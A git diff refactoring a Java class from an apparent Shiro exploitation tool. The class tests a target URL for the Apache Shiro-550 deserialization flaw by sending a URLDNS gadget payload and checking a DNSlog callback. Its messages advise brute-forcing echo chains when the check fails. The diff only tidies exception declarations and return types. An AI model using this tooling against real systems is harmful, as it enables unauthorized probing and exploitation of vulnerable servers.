@@ -6,18 +6,10 @@ import com.y5neko.shiroexp.gadget.URLDNS;
 import com.y5neko.shiroexp.request.HttpRequest;
 import okhttp3.FormBody;
 
-import javax.crypto.BadPaddingException;
-import javax.crypto.IllegalBlockSizeException;
-import javax.crypto.NoSuchPaddingException;
-import java.io.IOException;
-import java.lang.reflect.InvocationTargetException;
-import java.security.InvalidAlgorithmParameterException;
-import java.security.InvalidKeyException;
-import java.security.NoSuchAlgorithmException;
 import java.util.*;
 
 public class Shiro550VerifyByURLDNS {
-    public static String verify(TargetOBJ targetOBJ) throws IOException, NoSuchFieldException, ClassNotFoundException, InvocationTargetException, NoSuchMethodException, InstantiationException, IllegalAccessException, InvalidAlgorithmParameterException, NoSuchPaddingException, IllegalBlockSizeException, NoSuchAlgorithmException, BadPaddingException, InvalidKeyException, InterruptedException {
+    public static void verify(TargetOBJ targetOBJ) throws Exception {
         System.out.println("[" + Tools.color("INFO", "BLUE") + "] 正在通过URLDNS利用链进行验证");
         // 处理得到URLDNS的payload字节码
         String verifyRandom = Tools.generateRandomString(8);
@@ -48,13 +40,12 @@ public class Shiro550VerifyByURLDNS {
         String dnslogRecord = DnslogConfig.getDnslogRecord(dnslogInfo);
         if (dnslogRecord.contains(verifyRandom)){
             System.out.println("[" + Tools.color("SUCC", "GREEN") + "] 验证成功，目标存在Shiro550漏洞且出网");
-            return "成功";
+            return;
         }
         System.out.println("[" + Tools.color("INFO", "YELLOW") + "] 验证失败: 目标不存在漏洞或不出网，请手动查询dnslog或直接爆破回显链");
-        return "失败";
     }
 
-    public static void main(String[] args) throws IOException, NoSuchFieldException, ClassNotFoundException, InvocationTargetException, NoSuchMethodException, InstantiationException, IllegalAccessException, InvalidAlgorithmParameterException, NoSuchPaddingException, IllegalBlockSizeException, NoSuchAlgorithmException, BadPaddingException, InvalidKeyException, InterruptedException {
+    public static void main(String[] args) throws Exception {
         verify(new TargetOBJ("http://127.0.0.1:8080"));
     }
 }
